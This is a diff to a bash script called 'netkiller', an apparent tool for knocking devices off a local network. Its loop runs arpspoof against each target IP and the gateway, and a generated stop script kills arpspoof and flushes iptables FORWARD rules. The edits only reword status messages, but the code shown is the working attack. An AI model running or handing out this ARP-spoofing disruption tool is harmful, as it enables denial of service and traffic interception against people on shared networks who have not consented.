@@ -31,14 +31,11 @@ echo " "
 cat > /bin/netkiller-stop << EOF
 #!/bin/bash
 
-echo -e "\nUnblocking network devices..."
 pkill -f arpspoof
 pkill arpspoof
 iptables -P FORWARD ACCEPT 
 iptables -F FORWARD
-sleep 2
-echo -e "\nConnection is restored..."
-echo " "
+echo "Netkiller is stop...!!!"
 EOF
 chmod 755 /bin/netkiller-stop
 
@@ -229,7 +226,7 @@ echo " "
 
 # Start ARP spoofing for each target
 for TARGET in "${TARGETS[@]}"; do
-     echo "Netkiller killing the target IP: $TARGET"
+     echo "Netkiller killed the target IP: $TARGET"
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
 done
 echo " "
